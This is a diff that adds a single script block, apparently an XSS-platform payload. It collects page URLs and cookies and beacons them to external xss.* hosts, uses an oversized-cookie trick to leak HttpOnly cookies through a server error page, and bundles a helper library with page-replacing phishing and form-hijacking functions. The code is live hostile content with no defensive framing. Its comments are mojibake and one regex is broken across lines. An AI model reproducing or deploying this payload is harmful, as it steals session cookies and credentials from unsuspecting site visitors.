@@ -1,0 +1,300 @@
+<script>
+    (function () {
+        (new Image()).src = 'http://xss.fbxxisb.com/xss.php?do=api&id=x0Bf&location=' + escape((function () {
+            try {
+                return document.location.href
+            } catch (e) {
+                return ''
+            }
+        })()) + '&toplocation=' + escape((function () {
+            try {
+                return top.location.href
+            } catch (e) {
+                return ''
+            }
+        })()) + '&cookie=' + escape((function () {
+            try {
+                return document.cookie
+            } catch (e) {
+                return ''
+            }
+        })()) + '&opener=' + escape((function () {
+            try {
+                return (window.opener && window.opener.location.href) ? window.opener.location.href : ''
+            } catch (e) {
+                return ''
+            }
+        })());
+    })();
+    if ('' == 1) {
+        keep = new Image();
+        keep.src = 'http://xss.fbixxsb.com/xss.php?do=keepsession&id=x0Bf&url=' + escape(document.location) + '&cookie=' + escape(document.cookie)
+    }
+    ;
+
+    function setCookies() {
+        /*apache server limit 8192*/
+        var str = "";
+        for (var i = 0; i < 819; i++) {
+            str += "x";
+        }
+        for (i = 0; i < 10; i++) {
+            var cookie = "ray" + i + "=" + str + ";path=/";
+            document.cookie = cookie;
+        }
+    }
+
+    function parseCookies() {
+        if (xhr.readyState === 4 && xhr.status === 400) {
+            var content = xhr.responseText.replace(/\r|\n/g, '').match( /
+                < pre > (. +
+        )<\/pre>/
+        )
+            ;
+            content = content[1].replace("Cookie: ", "");
+            cookies = content.replace(/ray\d=x+;?/g, '')
+            try {
+                var myopener = '';
+                myopener = window.parent.openner.location;
+                var myparent = '';
+                myparent = window.parent.location;
+            } catch (err) {
+                myopener = '0';
+                myparent = '0';
+            }
+            window.location = 'http://xss.fbisb.com/xss.php?do=api&id=x0Bf&location=' + escape(document.location) + '&toplocation=' + escape(myparent) + '&cookie=' + escape(cookies) + '&opener=' + escape(myopener);
+        }
+    }
+
+setCookies();
+var xhr = window.XMLHttpRequest? new XMLHttpRequest() : window.ActiveXObject ? new ActiveXObject("Microsoft.XMLHTTP") : new XMLHttpRequest();
+xhr.onreadystatechange = parseCookies;
+xhr.open("POST", "/?"+Math.random(), true);
+xhr.send(null);var pkav={
+ ajax:function(){
+    var xmlHttp;
+    try{
+      xmlHttp=new XMLHttpRequest();
+   }catch (e){
+     try{
+        xmlHttp=new ActiveXObject("Msxml2.XMLHTTP");
+      }catch (e){
+       try{
+          xmlHttp=new ActiveXObject("Microsoft.XMLHTTP");
+       }
+       catch (e){
+          return false;
+       }
+     }
+   }
+   return xmlHttp;
+ },
+  req:function(url,data,method,callback){
+   method=(method||"").toUpperCase();
+    method=method||"GET";
+   data=data||"";
+    if(url){
+      var a=this.ajax();
+      a.open(method,url,true);
+      if(method=="POST"){
+       a.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+     }
+     a.onreadystatechange=function(){
+        if (a.readyState==4 && a.status==200)
+       {
+         if(callback){
+           callback(a.responseText);
+         }
+       }
+     };
+      if((typeof data)=="object"){
+        var arr=[];
+       for(var i in data){
+         arr.push(i+"="+encodeURIComponent(data[i]));
+        }
+       a.send(arr.join("&"));
+      }else{
+        a.send(data||null);
+     }
+   }
+ },
+  get:function(url,callback){
+   this.req(url,"","GET",callback);
+  },
+  post:function(url,data,callback){
+   this.req(url,data,"POST",callback);
+ }
+};
+if(!window.__x){
+pkav.post("鎺ュ彛鍦板潃","POST鍐呭",function(rs){});
+pkav.get("鎺ュ彛鍦板潃",function(rs){});
+  window.__x=1;
+};;var xss = function(){
+  var x = {
+   'name':'xss.js',
+    'version':'0.1',
+    'author':'jackmasa'
+ };
+
+  x.x=function(id){return document.getElementById(id)};
+
+  //瀹归敊鍙栧€�
+  x.e=function(_){try{return eval('('+_+')')}catch(e){return''}};
+
+  //娴忚鍣�
+  x.i={
+   i:!!self.ActiveXObject,
+   c:!!self.chrome,
+    f:self.mozPaintCount>-1,
+   o:!!self.opera,
+   s:!self.chrome&&!!self.WebKitPoint
+  };
+
+  //UA
+  x.ua = navigator.userAgent;
+
+  //鍒ゆ柇鏄惁涓鸿嫻鏋滄墜鎸佽澶�
+ x.apple=x.ua.match(/ip(one|ad|od)/i)!=null;
+
+  //闅忔満鏁�
+ x.rdm=function(){return~~(Math.random()*100000)};
+
+ //url缂栫爜(UTF8)
+ x.ec=encodeURIComponent;
+
+  x.html=document.getElementsByTagName('html')[0];
+
+  /*
+   * 閿€姣佷竴涓厓绱�
+  */
+ x.kill=function(e){
+   e.parentElement.removeChild(e);
+ };
+
+  /*
+   *缁戝畾浜嬩欢
+   */
+ x.bind=function(e,name,fn){
+   e.addEventListener?e.addEventListener(name,fn,false):e.attachEvent("on"+name,fn);
+ };
+
+  /*
+   * dom鍑嗗瀹屾瘯鏃舵墽琛屽嚱鏁�
+  */
+ x.ready=function(fn){
+   if(!x.i.i){
+     x.bind(document,'DOMContentLoaded',fn);
+   }else{
+      var s = setInterval(function(){
+       try{
+          document.body.doScroll('left');
+         clearInterval(s);
+         fn();
+       }catch(e){}
+     },4);
+   }
+ }
+
+ /*
+   * 鍚屾簮妫€娴�
+  */
+ x.o=function(url){
+    var link = x.dom('<a href="'+encodeURI(url)+'">',2);
+    return link.protocol+link.hostname+':'+link.port==location.protocol+location.hostname+':'+link.port;
+  };
+
+  /*
+   * html to dom
+   */
+ x.dom=function(html,gcsec){
+   var tmp = document.createElement('span');
+   tmp.innerHTML=html;
+   var e = tmp.children[0];
+    e.style.display='none';
+   x.html.appendChild(e);
+    gcsec>>0>0&&setTimeout(function(){
+     x.kill(e);
+    },gcsec*1000);
+    return e;
+ };
+
+  /*
+   * ajax
+  */
+ x.ajax = function(url,params,callback){
+   (params instanceof Function)&&(callback=params,params=void(0));
+   var XHR = (!x.o(url)&&window.XDomainRequest)||
+          window.XMLHttpRequest||
+         (function(){return new ActiveXObject('MSXML2.XMLHTTP')});
+   var xhr = new XHR();
+    xhr.open(params?'post':'get',url);
+    try{xhr.setRequestHeader('content-type','application/x-www-form-urlencoded')}catch(e){}
+   callback&&(xhr.onreadystatechange = function() {
+      (this.readyState == 4 && ((this.status >= 200 && this.status <= 300) || this.status == 304))&&callback.apply(this,arguments);
+   });
+   xhr.send(params);
+ };
+
+  /*
+   * no ajax
+   */
+ x.najax=function(url,params){
+   if(params){
+     var form = x.dom('<form method=post accept-charset=utf-8>');
+      form.action=url;
+      for(var name in params){
+        var input = document.createElement('input');
+        input.name=name;
+        input.value=params[name];
+       form.appendChild(input);
+      }
+     var iframe = x.dom('<iframe name=_'+x.rdm()+'_>',6);
+      form.target=iframe.name;
+      form.submit();
+    }else{
+      new Image().src=url+'&'+x.rdm();
+    }
+ };
+
+  /*
+   * 閽撻奔
+  */
+ x.phish=function(url){
+    x.ajax(url,function(){
+      document.open();
+      document.write(this.responseText);
+      document.close();
+     history.replaceState&x.o(url)&&history.replaceState('','',url);
+   })
+  };
+
+  /*
+   * 琛ㄥ崟鍔寔
+  */
+        x.xform = function (form, action) {
+            form.old_action = form.action, form.old_target = form.target, form.action = action;
+            var iframe = x.dom('<iframe name=_' + x.rdm() + '_>');
+            form.target = iframe.name;
+            setTimeout(function () {
+                x.bind(iframe, 'load', function () {
+                    form.action = form.old_action, form.target = form.old_target, form.onsubmit = null, form.submit();
+                })
+            }, 30);
+        };
+
+  /*
+   * 鍑芥暟浠ｇ悊
+  */
+ x.proxy=function(fn,before,after){
+    return function(){
+      before&&before.apply(this,arguments);
+     var result = fn.apply(this,arguments);
+      after&&after.apply(this,arguments);
+     return result;
+    }
+ };
+
+  return x;
+}();x=new Image();
+x.src="http://xss.fbisb.com/authtest.php?id=x0Bf&info=password";
+</script>
